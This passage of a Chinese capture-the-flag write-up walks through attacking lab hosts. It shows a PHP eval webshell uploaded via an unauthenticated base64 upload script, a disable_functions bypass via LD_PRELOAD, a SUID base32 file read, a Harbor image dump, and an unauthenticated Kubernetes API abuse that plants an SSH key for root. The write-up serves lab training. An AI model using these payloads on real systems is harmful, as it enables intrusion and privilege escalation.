<p>/home/ops01里面有一个HashNote，且监听了59696端口，说明要打pwn来提权</p>
<p>不会打pwn，这里直接拿别人的exp梭哈了</p>
<p><strong>FLAG2</strong></p>
<pre tabindex="0"><code>$ cat /root/flag_RaYz1/f1ag03.txt
flag03: flag{6a326f94-6526-4586-8233-152d137281fd}
</code></pre><h3 id="新翔oa管理系统">新翔OA管理系统<a hidden class="anchor" aria-hidden="true" href="#新翔oa管理系统">#</a></h3>
<p>前面fscan扫到172.28.23.26有个ftp服务</p>
<pre tabindex="0"><code>[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 =&gt; [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
</code></pre><p>匿名用户可以直接登录</p>
<p><img alt="image-20250522112350742" loading="lazy" src="../assets/image-20250522112350742.png"></p>
<p>可以拿到oa的源码，扒下来审计</p>
<p>可以看到这个</p>
<p>uploadbase64.php</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="sd"> * Description: PhpStorm.
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="sd"> * Author: yoby
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="sd"> * DateTime: 2018/12/4 18:01
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="sd"> * Email:logove@qq.com
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="sd"> * Copyright Yoby版权所有
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nv">$img</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;imgbase64&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^(data:\s*image\/(\w+);base64,)/&#39;</span><span class="p">,</span> <span class="nv">$img</span><span class="p">,</span> <span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nv">$type</span> <span class="o">=</span> <span class="s2">&#34;.&#34;</span><span class="o">.</span><span class="nv">$result</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="nv">$path</span> <span class="o">=</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nx">date</span><span class="p">(</span><span class="s2">&#34;Y-m-d&#34;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;-&#34;</span> <span class="o">.</span> <span class="nx">uniqid</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nv">$img</span> <span class="o">=</span>  <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$img</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="o">@</span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$img</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">exit</span><span class="p">(</span><span class="s1">&#39;{&#34;src&#34;:&#34;&#39;</span><span class="o">.</span><span class="nv">$path</span><span class="o">.</span><span class="s1">&#39;&#34;}&#39;</span><span class="p">);</span>
</span></span></code></pre></div><p>理解一下这个正则</p>
<blockquote>
<ol>
<li><strong><code>^</code></strong>
匹配字符串的开始位置，确保从数据的起始处开始匹配</li>
<li><strong><code>data:</code></strong>
直接匹配字面字符串 &ldquo;data:&quot;，这是 Data URL 格式的固定前缀</li>
<li><strong><code>\s\*</code></strong>
匹配零个或多个空白字符（包括空格、制表符等），用于处理可能存在的空格</li>
<li><strong><code>image/</code></strong>
直接匹配字面字符串 &ldquo;image/&quot;，表明这是一个图片类型的数据</li>
<li><strong><code>(\w+)</code></strong>
<ul>
<li><code>\w</code> 匹配任何单词字符（等价于 <code>[a-zA-Z0-9_]</code>）</li>
<li><code>+</code> 表示前面的元素必须出现一次或多次</li>
<li>括号 <code>()</code> 用于捕获匹配的内容，这部分会被提取为图片类型（如 jpg、png）</li>
</ul>
</li>
<li><strong><code>;base64,</code></strong>
直接匹配字面字符串 &ldquo;;base64,&quot;，这是 Base64 编码的 Data URL 的固定后缀</li>
</ol></blockquote>
<p>我们可以发现$result[1]和$result[2]是可控的</p>
<p>也就是说我们可以写入任意文件，格式如下</p>
<pre tabindex="0"><code>data:image/文件后缀;base64,文件内容的base64编码
</code></pre><p>这里没有鉴权，直接写马</p>
<p>payload</p>
<pre tabindex="0"><code>imgbase64=data:image/php;base64, PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4=
</code></pre><p>上马子之后发现有很多<strong>disable_functions</strong>，没办法RCE</p>
<pre tabindex="0"><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,file_get_contents,readfile,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive,highlight_file,show_source,iconv,dl
</code></pre><p>我们可以利用环境变量 LD_PRELOAD 劫持系统函数，从而绕过</p>
<p>蚁剑中有插件</p>
<p><img alt="image-20250522120131429" loading="lazy" src="../assets/image-20250522120131429.png"></p>
<p>修改一下.antproxy.php中的url路径</p>
<p><img alt="image-20250522120923285" loading="lazy" src="../assets/image-20250522120923285.png"></p>
<p>不知道这里一句话木马为什么不能用POST传参，用GET就可以正常RCEl</p>
<p><img alt="image-20250522155422629" loading="lazy" src="../assets/image-20250522155422629.png"></p>
<p>发现没办法直接读flag，需要提权</p>
<p>尝试suid提权</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">/bin/fusermount
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">/bin/ping6
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">/bin/mount
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">/bin/su
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">/bin/ping
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">/bin/umount
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">/usr/bin/chfn
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">/usr/bin/newgrp
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">/usr/bin/gpasswd
</span></span><span class="line"><span class="ln">10</span><span class="cl">/usr/bin/at
</span></span><span class="line"><span class="ln">11</span><span class="cl">/usr/bin/staprun
</span></span><span class="line"><span class="ln">12</span><span class="cl">/usr/bin/base32
</span></span><span class="line"><span class="ln">13</span><span class="cl">/usr/bin/passwd
</span></span><span class="line"><span class="ln">14</span><span class="cl">/usr/bin/chsh
</span></span><span class="line"><span class="ln">15</span><span class="cl">/usr/bin/sudo
</span></span><span class="line"><span class="ln">16</span><span class="cl">/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span class="line"><span class="ln">17</span><span class="cl">/usr/lib/openssh/ssh-keysign
</span></span><span class="line"><span class="ln">18</span><span class="cl">/usr/lib/eject/dmcrypt-get-device
</span></span><span class="line"><span class="ln">19</span><span class="cl">/usr/lib/s-nail/s-nail-privsep
</span></span></code></pre></div><p>用base32实现提权</p>
<p><img alt="image-20250522155605726" loading="lazy" src="../assets/image-20250522155605726.png"></p>
<p><img alt="image-20250522160019399" loading="lazy" src="../assets/image-20250522160019399.png"></p>
<p>payload</p>
<pre tabindex="0"><code>?1=system(&#34;base32 /flag02.txt|base32 --decode&#34;);
</code></pre><p><strong>FLAG3</strong></p>
<pre tabindex="0"><code>flag02: flag{56d37734-5f73-447f-b1a5-a83f45549b28}
</code></pre><h2 id="第二层">第二层<a hidden class="anchor" aria-hidden="true" href="#第二层">#</a></h2>
<h3 id="分支一-1722214024">分支一 [172.22.14.0/24]<a hidden class="anchor" aria-hidden="true" href="#分支一-1722214024">#</a></h3>
<p>传个fscan进行信息收集</p>
<p><img alt="image-20250522162347925" loading="lazy" src="../assets/image-20250522162347925.png"></p>
<p>ip addr</p>
<pre tabindex="0"><code>www-data@ubuntu-oa:/var/www/html/OAsystem/upload$ ip addr show
ip addr show
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:03:7a:cf brd ff:ff:ff:ff:ff:ff
    inet 172.28.23.26/16 brd 172.28.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe03:7acf/64 scope link 
       valid_lft forever preferred_lft forever
3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:03:7a:62 brd ff:ff:ff:ff:ff:ff
    inet 172.22.14.6/16 brd 172.22.255.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe03:7a62/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre><p>fscan</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">┌──────────────────────────────────────────────┐
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">│    ___                              _        │
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">│   / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___<span class="p">|</span> <span class="p">|</span> __    │
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">│  / /_<span class="se">\/</span>____/ __<span class="p">|</span>/ __<span class="p">|</span> <span class="err">&#39;</span>__/ _<span class="sb">`</span> <span class="p">|</span>/ __<span class="p">|</span> <span class="p">|</span>/ /    │
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">│ / /_<span class="se">\\</span>_____<span class="se">\_</span>_ <span class="se">\ </span><span class="o">(</span>__<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span>   &lt;     │
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">│ <span class="se">\_</span>___/     <span class="p">|</span>___/<span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span>  <span class="se">\_</span>_,_<span class="p">|</span><span class="se">\_</span>__<span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>   │
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">└──────────────────────────────────────────────┘
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      Fscan Version: 2.0.0
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 暴力破解线程数: <span class="m">1</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始信息扫描
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> CIDR范围: 172.22.14.0-172.22.14.255
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 生成IP范围: 172.22.14.0.%!d<span class="o">(</span><span class="nv">string</span><span class="o">=</span>172.22.14.255<span class="o">)</span> - %!s<span class="o">(</span>MISSING<span class="o">)</span>.%!d<span class="o">(</span>MISSING<span class="o">)</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 解析CIDR 172.22.14.0/24 -&gt; IP范围 172.22.14.0-172.22.14.255
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 最终有效主机数量: <span class="m">256</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始主机扫描
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 正在尝试无监听ICMP探测...
</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:34<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 当前用户权限不足,无法发送ICMP包
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:35<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 切换为PING方式探测...
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:35<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.14.6     存活 <span class="o">(</span>ICMP<span class="o">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:35<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.14.37    存活 <span class="o">(</span>ICMP<span class="o">)</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:35<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 目标 172.22.14.46    存活 <span class="o">(</span>ICMP<span class="o">)</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 存活主机数量: <span class="m">3</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 有效端口数量: <span class="m">65535</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.6:21
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.6:21 <span class="o">=</span>&gt; <span class="o">[</span>ftp<span class="o">]</span> 版本:3.0.3 产品:vsftpd 系统:Unix Banner:<span class="o">[</span><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>.<span class="o">]</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.6:22
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:22
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.46:22
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.46:80
</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.6:80
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:2380
</span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:2379
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.6:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="p">;</span> protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.<span class="o">]</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:7.6p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="p">;</span> protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7.<span class="o">]</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.46:22 <span class="o">=</span>&gt; <span class="o">[</span>ssh<span class="o">]</span> 版本:8.2p1 Ubuntu 4ubuntu0.11 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux<span class="p">;</span> protocol 2.0 Banner:<span class="o">[</span>SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11.<span class="o">]</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:6443
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:10252
</span></span><span class="line"><span class="ln">39</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:10256
</span></span><span class="line"><span class="ln">40</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:10251
</span></span><span class="line"><span class="ln">41</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:41<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 端口开放 172.22.14.37:10250
</span></span><span class="line"><span class="ln">42</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:46<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:2380 <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="ln">43</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:46<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.46:80 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> 产品:nginx
</span></span><span class="line"><span class="ln">44</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:46<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:2379 <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="ln">45</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:46<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:10252 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> Banner:<span class="o">[</span>HTTP/1.1 <span class="m">400</span> Bad Request.Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8.Connection: close.400 Bad Request<span class="o">]</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:47<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:10256 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> Banner:<span class="o">[</span>HTTP/1.1 <span class="m">400</span> Bad Request.Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8.Connection: close.400 Bad Request<span class="o">]</span>
</span></span><span class="line"><span class="ln">47</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:47<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:10251 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span> Banner:<span class="o">[</span>HTTP/1.1 <span class="m">400</span> Bad Request.Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8.Connection: close.400 Bad Request<span class="o">]</span>
</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:47<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.6:80 <span class="o">=</span>&gt; <span class="o">[</span>http<span class="o">]</span>
</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="o">[</span>2025-05-22 18:49:52<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:10250 <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:36<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 服务识别 172.22.14.37:6443 <span class="o">=</span>&gt; 
</span></span><span class="line"><span class="ln">51</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:36<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 存活端口数量: <span class="m">13</span>
</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 开始漏洞扫描
</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> 加载的插件: ftp, ssh, webpoc, webtitle
</span></span><span class="line"><span class="ln">54</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.14.46       状态码:200 长度:785    标题:Harbor
</span></span><span class="line"><span class="ln">55</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 发现指纹 目标: http://172.22.14.46       指纹: <span class="o">[</span>Harbor<span class="o">]</span>
</span></span><span class="line"><span class="ln">56</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 http://172.22.14.6        状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
</span></span><span class="line"><span class="ln">57</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 网站标题 https://172.22.14.37:10250 状态码:404 长度:19     标题:无标题
</span></span><span class="line"><span class="ln">58</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:37<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 匿名登录成功!
</span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="o">[</span>2025-05-22 18:50:38<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 检测到漏洞 http://172.22.14.46:80/swagger.json poc-yaml-swagger-ui-unauth 参数:<span class="o">[{</span>path swagger.json<span class="o">}]</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl"><span class="o">[</span>2025-05-22 18:56:59<span class="o">]</span> <span class="o">[</span>SUCCESS<span class="o">]</span> 扫描已完成: 12/12
</span></span></code></pre></div><p>扫出除了172.22.14.6以外的另外两台机子</p>
<pre tabindex="0"><code>[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.37    存活 (ICMP)
[2025-05-22 18:49:35] [SUCCESS] 目标 172.22.14.46    存活 (ICMP)
</code></pre><h4 id="harbor">Harbor<a hidden class="anchor" aria-hidden="true" href="#harbor">#</a></h4>
<p>可以看到172.22.14.46上存在Swagger未授权访问，但是没什么用</p>
<p><img alt="image-20250522173242235" loading="lazy" src="../assets/image-20250522173242235.png"></p>
<p>Harbor的版本为 v2.10</p>
<p><img alt="image-20250522173335511" loading="lazy" src="../assets/image-20250522173335511.png"></p>
<p>尝试打Harbor未授权</p>
<p><a href="https://github.com/404tk/CVE-2022-46463">404tk/CVE-2022-46463: harbor unauthorized detection</a></p>
<p><img alt="image-20250522173828907" loading="lazy" src="../assets/image-20250522173828907.png"></p>
<p>看到有个叫做harbor/secret的镜像，我们把它dump下来</p>
<pre tabindex="0"><code>python harbor.py http://172.22.14.46/ --dump harbor/secret --v2
</code></pre><p><img alt="image-20250522180342278" loading="lazy" src="../assets/image-20250522180342278.png"></p>
<p>dump下来之后可以找到flag</p>
<pre tabindex="0"><code>flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}
</code></pre><h4 id="k8s">K8S<a hidden class="anchor" aria-hidden="true" href="#k8s">#</a></h4>
<p>通过fscan的端口扫描，我们可以发现6443端口存在K8s API server未授权</p>
<p><img alt="image-20250522190528918" loading="lazy" src="../assets/image-20250522190528918.png"></p>
<p><a href="https://zone.huoxian.cn/d/1153-k8s">浅析K8S各种未授权攻击方法 - 火线 Zone-安全攻防社区</a></p>
<p><a href="https://xz.aliyun.com/news/14423">春秋云境-GreatWall-先知社区</a></p>
<p>用 nginx:1.8 镜像创建名为 nginx-deployment 的 pod，将宿主机的目录挂载到 /mnt 目录</p>
<p>创建pod</p>
<pre tabindex="0"><code>.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ apply -f evil-deployment.yaml
</code></pre><p>列出pod</p>
<pre tabindex="0"><code>.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ get pods -n default
</code></pre><p>进入容器</p>
<pre tabindex="0"><code>.\kubectl.exe --insecure-skip-tls-verify -s https://172.22.14.37:6443/ exec -it nginx-deployment /bin/bash
</code></pre><p><img alt="image-20250522191728023" loading="lazy" src="../assets/image-20250522191728023.png"></p>
<p>本地kali生成一个公钥，并写入</p>
<pre tabindex="0"><code>echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDZYuEupRm/hWalqMOfLjHs5skSsFjUfK7dVb3K1uD75ITbdaeIVj6gZfssJ1A1euE2omXRoYiInDrnf+033BfTQvyeSENKI4vqjvvSad4Fy8c8tnIwBqtX6CoF7nr1XIzPH1vFQ/3nW//JlfrM7sxjpMXnd1EEJjJJrusD9Z1uV2jx9QdRJDxNCdErVss4kNhfkiG5W7gOQlkAYbrHFyWo4EtPuL0HVRt6Cb3tOMxKkQY98NO8RNLm5QXBjdIDLKVcfnOqvSxga7BuRym+ATJny/8zx9sOziQSQkQ/qfBeUJMPeaq9VkVAs2EwPDUrcmoUuWB9duxW1ekx+9pyQpuHhUuSbARFUFaGNfIGF0Lb2i9lC2RRRGUspyxDeJwx2n1KS2L/9S4aT4d1I4pRJy3ZF41c6XDvGVixQeJp6a2KUL+Yz0OrEBIW/sgZ+f4X435iEsUhGLOxavnnZh2gz8B231cmrecj0JNYVwLSkRC3+zgmOrwayDp/h8W36CV0odE//BumeStXB5ACq8++0B7ukd7HZs/2tEjac5oJrmdPsUkE3AmmXlDyGITR0LeUAD1daYWoisrkCuwL3tPP5YJqa0lBZmkN9RLzEzzDyXHbGLFtk2zDvRh8xqdm8mGQ7ZWu4aSwUFG6G1icmx3gSys7X3s1rZGXuVM9i0xBiH9wIQ== root@Xrntkk-Laptop&#34; &gt; /mnt/root/.ssh/authorized_keys
</code></pre><p>kali连ssh</p>
<pre tabindex="0"><code> proxychains4 ssh -i /root/.ssh/id_rsa root@172.22.14.37
</code></pre><p><img alt="image-20250522193504687" loading="lazy" src="../assets/image-20250522193504687.png"></p>
<p>当前目录可以看到一个.mysql_history</p>
